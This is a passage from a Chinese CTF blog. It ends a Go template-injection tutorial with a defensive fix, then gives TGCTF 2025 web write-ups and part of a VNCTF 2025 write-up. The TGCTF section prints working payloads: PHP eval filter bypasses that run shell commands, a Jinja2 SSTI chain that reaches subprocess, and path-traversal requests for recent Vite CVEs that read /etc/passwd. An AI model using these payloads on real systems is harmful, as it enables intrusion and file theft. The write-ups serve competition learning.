&#123;&#123;if pipeline&#125;&#125; T1 &#123;&#123;else&#125;&#125;&#123;&#123;if pipeline&#125;&#125; T0 &#123;&#123;end&#125;&#125;&#123;&#123;end&#125;&#125;


range..end迭代
&#123;&#123;range pipeline&#125;&#125; T1 &#123;&#123;end&#125;&#125;
&#123;&#123;range pipeline&#125;&#125; T1 &#123;&#123;else&#125;&#125; T0 &#123;&#123;end&#125;&#125;

with..end设置.的值
&#123;&#123;with pipeline&#125;&#125; T1 &#123;&#123;end&#125;&#125;
&#123;&#123;with pipeline&#125;&#125; T1 &#123;&#123;else&#125;&#125; T0 &#123;&#123;end&#125;&#125;

template 引入模板
&#123;&#123;template &#x27;login&#x27;&#125;&#125;

&#123;&#123;with pipeline&#125;&#125; T1 &#123;&#123;end&#125;&#125;
  如果管道值为空，则不产生输出；否则，dot 将被设置为管道值，T1 将被执行。
  
&#123;&#123;with pipeline&#125;&#125; T1 &#123;&#123;else&#125;&#125; T0 &#123;&#123;end&#125;&#125;
  如果管道值为空，dot不受影响，T0会被执行；否则，dot会被设置为pipeline的值，T1 会被执行。
  with和if的区别在于with会将返回值储存在&quot;.&quot;中，后续可以访问。</code></pre>
<p>一但知道源码的有哪些对象就能够进行敏感内容的泄露</p>
<p>同时如果有危险函数就会被调用进行一些越权操作</p>
<p>当过滤严格的时候也可以做一些混淆</p>
<p>比如这篇[文章](<a href="https://blog.thekingofduck.com/post/ssti-in-golnag/">Golang中的SSTI | CoolCat’ Blog</a>)中的最后</p>
<pre><code class="highlight plaintext">&#123;&#123;/*&quot;&#125;&#125;&#123;&#123;&quot;*/&#125;&#125;&#123;&#123;- printf `%sam%s` `who` `i`| .Secret -&#125;&#125;&#123;&#123;/*&quot;&#125;&#125;&#123;&#123;&quot;*/&#125;&#125;</code></pre>
<p>直接草拦正则</p>
<h3 id="例题"><a class="markdownIt-Anchor" href="#例题"></a> 例题</h3>
<p><s>砍一刀</s>看一道例题，没有源码</p>
<p>到这里可能会有些人很疑惑<code>.</code>的作用规则</p>
<p>大概是这样的，在模板中</p>
<ul>
<li>
<p>如果 <code>.</code> 是 <strong>struct</strong>，写 <code>.Field</code> 会取结构体的字段或方法；</p>
</li>
<li>
<p>如果 <code>.</code> 是 <strong>map</strong>，写 <code>.key</code> 会尝试取 map[“key”]；</p>
</li>
<li>
<p>如果 <code>.</code> 是 <strong>FuncMap</strong>（本质上也是 map[string]interface{}），写 <code>.exec</code> 就是取出 <code>map[&quot;exec&quot;]</code>。</p>
</li>
</ul>
<p><code>.</code>强调的是当前上下文的对象，而直接引用的则是强调全局</p>
<h3 id="防御"><a class="markdownIt-Anchor" href="#防御"></a> 防御</h3>
<p>你知道的，我们一直没有提到<code>html/template</code></p>
<p>它能够防御住XSS以及并且转义大部分的js代码</p>
<p>但是至于危险函数这些还是要从源头上根治，拒绝我们的直接渲染/拼接</p>
<p>对于渲染的问题，千万不要拼接，采用<code>&#123;&#123;.[对象]&#125;&#125;</code>的方法去返回</p>
<p>引用这位<a href="%5BGo%E8%AF%AD%E8%A8%80%E4%B8%8B%E7%9A%84%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA%5D(https://xz.aliyun.com/news/12088)">师傅</a>的例子</p>
<pre><code class="highlight plaintext">package main
import (
    &quot;fmt&quot;
    &quot;net/http&quot;
    &quot;strings&quot;
    &quot;text/template&quot;
)
type User struct &#123;
    Id     int
    Name   string
    Passwd string
&#125;

func StringTplExam(w http.ResponseWriter, r *http.Request) &#123;
    user := &amp;User&#123;1, &quot;admin&quot;, &quot;123456&quot;&#125;
    r.ParseForm()
    arg := strings.Join(r.PostForm[&quot;name&quot;], &quot;&quot;)
    tpl1 := fmt.Sprintf(`&lt;h1&gt;Hi, ` + arg + `&lt;/h1&gt; Your name is ` + arg + `!`)//使用Sprintf，将数据进行拼接以后返回纯文本再赋值给tpl1；
    html, err := template.New(&quot;login&quot;).Parse(tpl1)//进行模板渲染
    //这里创建一个名为 &quot;login&quot; 的模板，并将模板字符串 tpl1 解析到该模板中。template.New()函数作用是创建一个新的模板，Parse()是用于解析模板字符串。
    html = template.Must(html, err)
    html.Execute(w, user)
&#125;

func main() &#123;
    server := http.Server&#123;
        Addr: &quot;127.0.0.1:8080&quot;,
    &#125;
    http.HandleFunc(&quot;/login&quot;, StringTplExam)
    server.ListenAndServe()
&#125;

fix:
func StringTpl2Exam(w http.ResponseWriter, r *http.Request) &#123;
    user := &amp;User&#123;1, &quot;tyskill&quot;, &quot;tyskill&quot;&#125;
    r.ParseForm()
    arg := strings.Join(r.PostForm[&quot;name&quot;], &quot;&quot;)
    tpl := `&lt;h1&gt;Hi, &#123;&#123; .arg &#125;&#125;&lt;/h1&gt;&lt;br&gt;Your name is &#123;&#123; .Name &#125;&#125;`
    data := map[string]string&#123;
        &quot;arg&quot;:  arg,
        &quot;Name&quot;: user.Name,
    &#125;
    html := template.Must(template.New(&quot;login&quot;).Parse(tpl))
    html.Execute(w, data)
&#125;</code></pre>
<p>防御点解析:</p>
<ol>
<li>模板中使用 <code>&#123;&#123; .arg &#125;&#125;</code> 和 <code>&#123;&#123; .Name &#125;&#125;</code> 来引用变量。可以防止直接将用户输入的内容作为字符串插入到模板中，模板引擎会对这些变量进行合适的转义。</li>
<li>创建了一个名为 <code>data</code> 的 <code>map</code>，用于存储模板中需要的数据。在这个 <code>map</code> 中，键名与模板中的变量名相对应，键值则为相应的数据。这样可以避免直接将用户输入的值作为变量名，减少了可能的安全风险。</li>
</ol>
]]></content>
      <tags>
        <tag>-CTF -Web</tag>
      </tags>
  </entry>
  <entry>
    <title>TGCTF_Writeup</title>
    <url>/2025/04/18/TGCTF-Writeup/</url>
    <content><![CDATA[<h1 id="tgctf2025"><a class="markdownIt-Anchor" href="#tgctf2025"></a> TGCTF2025</h1>
<p>这比赛说他好吧，确实让我发现自己的知识点漏洞有多大(哈哈，还是过过的知识点，恨不得给自己一巴掌，差点就可以卷铺盖走人了)。说差，你吗的前端游戏我一直以为题目就是那个错误页面，第二天又开才发现是正常的前端游戏，构式靶机。。。还有一堆莫名其妙的脑洞和对电波环节，有点。。了吧</p>
<h2 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h2>
<h3 id="aaa偷渡阴平"><a class="markdownIt-Anchor" href="#aaa偷渡阴平"></a> <strong>AAA偷渡阴平</strong></h3>
<pre><code class="highlight php"> <span class="meta">&lt;?php</span>


<span class="variable">$tgctf2025</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;tgctf2025&#x27;</span>];

<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/0|1|[3-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$tgctf2025</span>))&#123;
    <span class="comment">//hint：你可以对着键盘一个一个看，然后在没过滤的符号上用记号笔画一下（bushi</span>
    <span class="keyword">eval</span>(<span class="variable">$tgctf2025</span>);
&#125;
<span class="keyword">else</span>&#123;
    <span class="keyword">die</span>(<span class="string">&#x27;(╯‵□′)╯炸弹！•••*～●&#x27;</span>);
&#125;

<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</code></pre>
<p>一眼无参RCE。。网上随便找个poc过了</p>
<pre><code class="highlight php">?tgctf2025=<span class="keyword">eval</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">get_defined_vars</span>())));&amp;jiang=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /f*&#x27;</span>);</code></pre>
<h3 id="火眼辩魑魅"><a class="markdownIt-Anchor" href="#火眼辩魑魅"></a> <strong>火眼辩魑魅</strong></h3>
<p>robots.txt</p>
<pre><code class="highlight plaintext">User-Agent: *
Disallow: tgupload.php
Disallow: tgshell.php
Disallow: tgxff.php
Disallow: tgser.php
Disallow: tgphp.php
Disallow: tginclude.phphttp://node1.tgctf.woooo.tech:32484/</code></pre>
<p>我是唇笔所以净喜欢走弯路哈哈。。</p>
<p>明明题面已经说要看哪个了</p>
<p>稍微尝试了一下发现system,passthru这些基本都被ban了</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250412143217444.png" alt="image-20250412143217444"></p>
<pre><code class="highlight plaintext">shell=echo `cat /tg*`;</code></pre>
<p>但是赛后看官方WP看红温了哈哈，官方给的是tgxff.php然后用ssti打，说是其他能打出来就是非预期哦，鉴定为史</p>
<p>同时上面这个shell其实直接连都可以。。。算是绕弯了</p>
<h3 id="aaa偷渡阴平复仇"><a class="markdownIt-Anchor" href="#aaa偷渡阴平复仇"></a> <strong>AAA偷渡阴平(复仇)</strong></h3>
<p>ban了无参RCE，但是一样打</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$tgctf2025</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;tgctf2025&#x27;</span>];
<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/0|1|[3-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\|localeconv|pos|current|print|var|dump|getallheaders|get|defined|str|split|spl|autoload|extensions|eval|phpversion|floor|sqrt|tan|cosh|sinh|ceil|chr|dir|getcwd|getallheaders|end|next|prev|reset|each|pos|current|array|reverse|pop|rand|flip|flip|rand|content|echo|readfile|highlight|show|source|file|assert/i&quot;</span>, <span class="variable">$tgctf2025</span>))&#123;
    <span class="comment">//hint：你可以对着键盘一个一个看，然后在没过滤的符号上用记号笔画一下（bushi</span>
    <span class="keyword">eval</span>(<span class="variable">$tgctf2025</span>);
&#125;
<span class="keyword">else</span>&#123;
    <span class="keyword">die</span>(<span class="string">&#x27;(╯‵□′)╯炸弹！•••*～●&#x27;</span>);
&#125;

<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
</code></pre>
<p>poc:</p>
<pre><code class="highlight php">?tgctf2025=<span class="title function_ invoke__">session_start</span>();<span class="title function_ invoke__">passthru</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">session_id</span>()));
PHPSESSID=<span class="number">636174202</span>f666c6167</code></pre>
<h3 id="直面天命"><a class="markdownIt-Anchor" href="#直面天命"></a> <strong>直面天命</strong></h3>
<p>先看一眼源码</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250413221047192.png" alt="image-20250413221047192"></p>
<p>换hint</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250413221120246.png" alt="image-20250413221120246"></p>
<p>。。懒得喷，我直接pt买hint了哈哈</p>
<p>这里贴一下队里师傅的脚本</p>
<pre><code class="highlight py"><span class="keyword">import</span> requests
<span class="keyword">import</span> itertools
<span class="keyword">import</span> string
<span class="keyword">import</span> time
<span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor

<span class="comment"># 目标网站的基础URL - 使用前请替换为实际目标URL</span>
BASE_URL = <span class="string">&quot;http://node2.tgctf.woooo.tech:32010/&quot;</span>  <span class="comment"># 请替换为实际目标URL</span>

<span class="comment"># 使用所有26个小写字母</span>
all_letters = string.ascii_lowercase  <span class="comment"># &#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>

<span class="comment"># 定义测试单个路径的函数</span>


<span class="keyword">def</span> <span class="title function_">test_path</span>(<span class="params">path</span>):
    url = BASE_URL + path
    <span class="keyword">try</span>:
        response = requests.get(url, timeout=<span class="number">3</span>)

        <span class="comment"># 根据状态码和响应长度来判断是否找到有效页面</span>
        status = response.status_code
        length = <span class="built_in">len</span>(response.text)

        <span class="comment"># 记录所有非404响应</span>
        <span class="keyword">if</span> status != <span class="number">404</span>:
            <span class="built_in">print</span>(<span class="string">f&quot;[+] 发现: <span class="subst">&#123;url&#125;</span> (状态码: <span class="subst">&#123;status&#125;</span>, 长度: <span class="subst">&#123;length&#125;</span>)&quot;</span>)

            <span class="comment"># 保存发现的路径到文件中</span>
            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;found_paths.txt&quot;</span>, <span class="string">&quot;a&quot;</span>) <span class="keyword">as</span> f:
                f.write(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span> (状态码: <span class="subst">&#123;status&#125;</span>, 长度: <span class="subst">&#123;length&#125;</span>)\n&quot;</span>)

            <span class="comment"># 如果是200状态码，保存响应内容以便检查</span>
            <span class="keyword">if</span> status == <span class="number">200</span>:
                <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&quot;response_<span class="subst">&#123;path&#125;</span>.html&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:
                    f.write(response.text)

    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:
        <span class="keyword">pass</span>  <span class="comment"># 忽略连接错误，继续测试</span>

    <span class="keyword">return</span> path


<span class="comment"># 显示开始信息</span>
<span class="built_in">print</span>(<span class="string">&quot;[*] 开始爆破所有4字母路径...&quot;</span>)
<span class="built_in">print</span>(<span class="string">f&quot;[*] 目标URL: <span class="subst">&#123;BASE_URL&#125;</span>&quot;</span>)
<span class="built_in">print</span>(<span class="string">f&quot;[*] 总组合数: <span class="subst">&#123;<span class="number">26</span>**<span class="number">4</span>&#125;</span> (这可能需要一些时间)&quot;</span>)

<span class="comment"># 跟踪进度变量</span>
total_combinations = <span class="number">26</span>**<span class="number">4</span>  <span class="comment"># 可能的4字母组合总数</span>
completed = <span class="number">0</span>
start_time = time.time()

<span class="comment"># 使用多线程加速过程</span>
<span class="keyword">with</span> ThreadPoolExecutor(max_workers=<span class="number">20</span>) <span class="keyword">as</span> executor:
    <span class="comment"># 生成并测试所有4字母组合</span>
    <span class="keyword">for</span> combo <span class="keyword">in</span> itertools.product(all_letters, repeat=<span class="number">4</span>):
        path = <span class="string">&#x27;&#x27;</span>.join(combo)
        executor.submit(test_path, path)

        <span class="comment"># 定期更新进度</span>
        completed += <span class="number">1</span>
        <span class="keyword">if</span> completed % <span class="number">5000</span> == <span class="number">0</span>:
            elapsed = time.time() - start_time
            percentage = (completed / total_combinations) * <span class="number">100</span>
            rate = completed / elapsed <span class="keyword">if</span> elapsed &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span>
            remaining = (total_combinations - completed) / \
                rate <span class="keyword">if</span> rate &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span>

            <span class="built_in">print</span>(<span class="string">f&quot;[*] 进度: <span class="subst">&#123;completed&#125;</span>/<span class="subst">&#123;total_combinations&#125;</span> (<span class="subst">&#123;percentage:<span class="number">.2</span>f&#125;</span>%) - &quot;</span>
                  <span class="string">f&quot;已用时间: <span class="subst">&#123;elapsed:<span class="number">.1</span>f&#125;</span>秒 - 预计剩余: <span class="subst">&#123;remaining:<span class="number">.1</span>f&#125;</span>秒 - 速度: <span class="subst">&#123;rate:<span class="number">.1</span>f&#125;</span>请求/秒&quot;</span>)

<span class="built_in">print</span>(<span class="string">&quot;[*] 爆破完成! 查看 &#x27;found_paths.txt&#x27; 获取结果。&quot;</span>)</code></pre>
<p><code>/aazz</code></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250413221221814.png" alt="image-20250413221221814"></p>
<p>…参…数…?那我问你，参数名是什么，那我问你(也有可能是我没进群所以没看到类似通知的缘故)</p>
<p>反正后面知道是filename(赛后知道这个也是要fuzz出来的),看名字应该就是任意文件读取了</p>
<p>稍微试一下啊</p>
<p>预期应该是抓源码的，结果哈哈</p>
<pre><code class="highlight plaintext">aazz?filename=../../flag</code></pre>
<p>贴一个源码吧</p>
<pre><code class="highlight python"><span class="keyword">import</span> os
<span class="keyword">import</span> string
<span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string, jsonify, send_from_directory
<span class="keyword">from</span> a.b.c.d.secret <span class="keyword">import</span> secret_key

app = Flask(__name__)

black_list=[<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;os&#x27;</span>,<span class="string">&#x27;import&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;read&#x27;</span>,<span class="string">&#x27;base&#x27;</span>,<span class="string">&#x27;globals&#x27;</span>]
<span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">name</span>):
    <span class="keyword">for</span> x <span class="keyword">in</span> black_list:
        <span class="keyword">if</span> x <span class="keyword">in</span> name.lower():
            <span class="keyword">return</span> <span class="literal">True</span>
    <span class="keyword">return</span> <span class="literal">False</span>
<span class="keyword">def</span> <span class="title function_">is_typable</span>(<span class="params">char</span>):
    <span class="comment"># 定义可通过标准 QWERTY 键盘输入的字符集</span>
    typable_chars = string.ascii_letters + string.digits + string.punctuation + string.whitespace
    <span class="keyword">return</span> char <span class="keyword">in</span> typable_chars

<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span>
<span class="keyword">def</span> <span class="title function_">home</span>():
    <span class="keyword">return</span> send_from_directory(<span class="string">&#x27;static&#x27;</span>, <span class="string">&#x27;index.html&#x27;</span>)

<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/jingu&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span>
<span class="keyword">def</span> <span class="title function_">greet</span>():
    template1=<span class="string">&quot;&quot;</span>
    template2=<span class="string">&quot;&quot;</span>
    name = request.form.get(<span class="string">&#x27;name&#x27;</span>)
    template = <span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>&#x27;</span>
    <span class="keyword">if</span> waf(name):
        template = <span class="string">&#x27;想干坏事了是吧hacker？哼，还天命人，可笑，可悲，可叹</span></code></pre>
<h3 id="直面天命复仇"><a class="markdownIt-Anchor" href="#直面天命复仇"></a> <strong>直面天命（复仇）</strong></h3>
<pre><code class="highlight python"><span class="keyword">import</span> os
<span class="keyword">import</span> string
<span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string, jsonify, send_from_directory
<span class="keyword">from</span> a.b.c.d.secret <span class="keyword">import</span> secret_key

app = Flask(__name__)

black_list=[<span class="string">&#x27;lipsum&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;map&#x27;</span>,<span class="string">&#x27;chr&#x27;</span>, <span class="string">&#x27;value&#x27;</span>, <span class="string">&#x27;get&#x27;</span>, <span class="string">&quot;url&quot;</span>, <span class="string">&#x27;pop&#x27;</span>,<span class="string">&#x27;include&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;os&#x27;</span>,<span class="string">&#x27;import&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;read&#x27;</span>,<span class="string">&#x27;base&#x27;</span>,<span class="string">&#x27;globals&#x27;</span>,<span class="string">&#x27;_.&#x27;</span>,<span class="string">&#x27;set&#x27;</span>,<span class="string">&#x27;application&#x27;</span>,<span class="string">&#x27;getitem&#x27;</span>,<span class="string">&#x27;request&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;init&#x27;</span>, <span class="string">&#x27;arg&#x27;</span>, <span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;app&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]
<span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">name</span>):
    <span class="keyword">for</span> x <span class="keyword">in</span> black_list:
        <span class="keyword">if</span> x <span class="keyword">in</span> name.lower():
            <span class="keyword">return</span> <span class="literal">True</span>
    <span class="keyword">return</span> <span class="literal">False</span>
<span class="keyword">def</span> <span class="title function_">is_typable</span>(<span class="params">char</span>):
    <span class="comment"># 定义可通过标准 QWERTY 键盘输入的字符集</span>
    typable_chars = string.ascii_letters + string.digits + string.punctuation + string.whitespace
    <span class="keyword">return</span> char <span class="keyword">in</span> typable_chars

<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span>
<span class="keyword">def</span> <span class="title function_">home</span>():
    <span class="keyword">return</span> send_from_directory(<span class="string">&#x27;static&#x27;</span>, <span class="string">&#x27;index.html&#x27;</span>)

<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/jingu&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span>
<span class="keyword">def</span> <span class="title function_">greet</span>():
    template1=<span class="string">&quot;&quot;</span>
    template2=<span class="string">&quot;&quot;</span>
    name = request.form.get(<span class="string">&#x27;name&#x27;</span>)
    template = <span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>&#x27;</span>
    <span class="keyword">if</span> waf(name):
        template = <span class="string">&#x27;想干坏事了是吧hacker？哼，还天命人，可笑，可悲，可叹</span>
<span class="string">Image&#x27;</span>
    <span class="keyword">else</span>:
        k=<span class="number">0</span>
        <span class="keyword">for</span> i <span class="keyword">in</span> name:
            <span class="keyword">if</span> is_typable(i):
                <span class="keyword">continue</span>
            k=<span class="number">1</span>
            <span class="keyword">break</span>
        <span class="keyword">if</span> k==<span class="number">1</span>:
            <span class="keyword">if</span> <span class="keyword">not</span> (secret_key[:<span class="number">2</span>] <span class="keyword">in</span> name <span class="keyword">and</span> secret_key[<span class="number">2</span>:]):
                template = <span class="string">&#x27;连“六根”都凑不齐，谈什么天命不天命的，还是戴上这金箍吧</span>
<span class="string"></span>
<span class="string">再去西行历练历练</span>
<span class="string"></span>
<span class="string">Image&#x27;</span>
                <span class="keyword">return</span> render_template_string(template)
            template1 = <span class="string">&quot;“六根”也凑齐了，你已经可以直面天命了！我帮你把“secret_key”替换为了“&#123;&#123;&#125;&#125;”</span>
<span class="string">最后，如果你用了cat，就可以见到齐天大圣了</span>
<span class="string">&quot;</span>
            template= template.replace(<span class="string">&quot;天命&quot;</span>,<span class="string">&quot;&#123;&#123;&quot;</span>).replace(<span class="string">&quot;难违&quot;</span>,<span class="string">&quot;&#125;&#125;&quot;</span>)
            template = template
    <span class="keyword">if</span> <span class="string">&quot;cat&quot;</span> <span class="keyword">in</span> template:
        template2 = <span class="string">&#x27;</span>
<span class="string">或许你这只叫天命人的猴子，真的能做到？</span>
<span class="string"></span>
<span class="string">Image&#x27;</span>
    <span class="keyword">try</span>:
        <span class="keyword">return</span> template1+render_template_string(template)+render_template_string(template2)
    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:
        error_message = <span class="string">f&quot;500报错了，查询语句如下：</span>
<span class="string"><span class="subst">&#123;template&#125;</span>&quot;</span>
        <span class="keyword">return</span> error_message, <span class="number">400</span>

<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hint&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span>
<span class="keyword">def</span> <span class="title function_">hinter</span>():
    template=<span class="string">&quot;hint：</span>
<span class="string">有一个aazz路由，去那里看看吧，天命人!&quot;</span>
    <span class="keyword">return</span> render_template_string(template)

<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/aazz&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span>
<span class="keyword">def</span> <span class="title function_">finder</span>():
    <span class="keyword">with</span> <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:
        source_code = f.read()
    <span class="keyword">return</span> <span class="string">f&quot;</span>
<span class="string"><span class="subst">&#123;source_code&#125;</span></span>
<span class="string">&quot;</span>, <span class="number">200</span>, &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/html; charset=utf-8&#x27;</span>&#125;

<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:
    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</code></pre>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250413215533251.png" alt="image-20250413215533251"></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250413215326433.png" alt="image-20250413215326433"></p>
<p>最终paylaod</p>
<pre><code class="highlight plaintext">name=天命()[&#x27;\x5f\x5fclass\x5f\x5f&#x27;][&#x27;\x5f\x5fmro\x5f\x5f&#x27;][-1][&#x27;\x5f\x5fsubclasses\x5f\x5f&#x27;]()[351](&#x27;cat ntgffff11111aaaagggggggg&#x27;,shell=True,stdout=-1).communicate()[0].strip()难违</code></pre>
<p>看队里师傅wp这题是能用fenjing的，有点难绷哈哈</p>
<h3 id="前端游戏复现"><a class="markdownIt-Anchor" href="#前端游戏复现"></a> 前端游戏(复现)</h3>
<p><code>CVE-2025-30208</code></p>
<pre><code class="highlight plaintext">/@fs/tgflagggg?import&amp;raw??
/@fs/tgflagggg?raw??</code></pre>
<h3 id="前端游戏plus-复现"><a class="markdownIt-Anchor" href="#前端游戏plus-复现"></a> 前端游戏Plus (复现)</h3>
<p><code>CVE-2025-31486</code>的复现</p>
<p>是一个任意文件读的漏洞</p>
<p>先贴出poc</p>
<pre><code class="highlight plaintext">/tgflagggg?.svg?.wasm?init</code></pre>
<p>打完之后还尝试了一下打穿一下root</p>
<pre><code class="highlight plaintext">/etc/passwd?.svg?.wasm?init</code></pre>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250415135336099.png" alt="image-20250415135336099"></p>
<p>看了一眼原CVE下的另一个poc</p>
<pre><code class="highlight plaintext">curl &#x27;http://127.0.0.1:5173/@fs/x/x/x/vite-project/?/../../../../../etc/passwd?import&amp;?raw&#x27;
#https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x</code></pre>
<p>这个是打不穿的,因为前面目录的名字未知，不好打，贴一下官方WP的POC</p>
<pre><code class="highlight plaintext">@fs/app/?/../../../../../tgflagggg?import&amp;?raw</code></pre>
<h3 id="前端游戏ultra复现"><a class="markdownIt-Anchor" href="#前端游戏ultra复现"></a> 前端游戏Ultra(复现)</h3>
<p>这三个前端的CVE都挺新的</p>
<p><code>CVE-2025-32395</code></p>
<p>先贴原漏洞的poc</p>
<pre><code class="highlight plaintext">curl --request-target /@fs/Users/doggy/Desktop/vite-project/#/../../../../../etc/passwd http://127.0.0.1:5173
#https://github.com/vitejs/vite/security/advisories/GHSA-356w-63v5-8wf4</code></pre>
<p>这个就是真要猜测路径了哈哈(</p>
<p>幸好给了源码</p>
<p>复现的时候哈基bar应激了，换了bp打<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250415141634705.png" alt="image-20250415141634705"></p>
<p>不知道为什么官方poc给的是四个套，虽然不影响结果，但是先质疑再质疑哈</p>
<p>顺带看到了另一个相关的CVE，也学习一下算了</p>
<p><code>CVE-2025-31125</code></p>
<p>这个洞是利用inline的规则配合.wsam进行绕过(是对第一个CVE的补丁的绕过)</p>
<pre><code class="highlight plaintext">/@fs/C://windows/win.ini?import&amp;inline=1.wasm?init</code></pre>
<p>这边引用一下大佬的解释好了</p>
<pre><code class="highlight plaintext">除了?url和?raw还有一种内联的方法?inline，他的作用是：
将文件（如图片、字体、WASM 等）的内容转换为 Base64 编码字符串 或 直接嵌入到 JS/HTML/CSS 中，避免额外的 HTTP 请求
?init主要用于 WebAssembly（.wasm）文件的初始化，默认只有.wasm支持?init其他如.data、.bin可以通过插件拓展支持
通过这种新的方法绕过了修复后的正则过滤
//原链接https://cloud.tencent.com/developer/article/2513407</code></pre>
]]></content>
      <tags>
        <tag>-WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>VNCTF2025</title>
    <url>/2025/02/10/VNCTF2025/</url>
    <content><![CDATA[<h1 id="vnctf-2025"><a class="markdownIt-Anchor" href="#vnctf-2025"></a> VNCTF 2025</h1>
<p>入坑CTF以来打过最难的个人赛，打完的表情就像先辈的一张表情包一样</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/e7584e8da9773912fec999bbbd198618347ae2dc.jpg" alt="img"></p>
<p>比赛期间就出了一题，这才是正统misc吗哈哈(</p>
<h2 id="vn_lang"><a class="markdownIt-Anchor" href="#vn_lang"></a> <strong>VN_Lang</strong></h2>
<p>不能较真的签到题，附件一个exe,一个莫名其妙的源代码。看起来花里胡哨，实际010一查就出来了</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210180505746.png" alt="image-20250210180505746"></p>
<h2 id="echo_flowers"><a class="markdownIt-Anchor" href="#echo_flowers"></a> echo_flowers</h2>
<p>区块链的基本知识和取证搭配的好题。大概?</p>
<p>给了一个安卓的镜像，先VM开了，不得不吐槽的一点是，操作是真吃力啊。。。</p>
<p>先放个hint<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210180853422.png" alt="image-20250210180853422"></p>
<p>我没有那么多知识储备，所以其实能用的hint也不多，就一个软件本身没有缓存<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210180951701.png" alt="image-20250210180951701"></p>
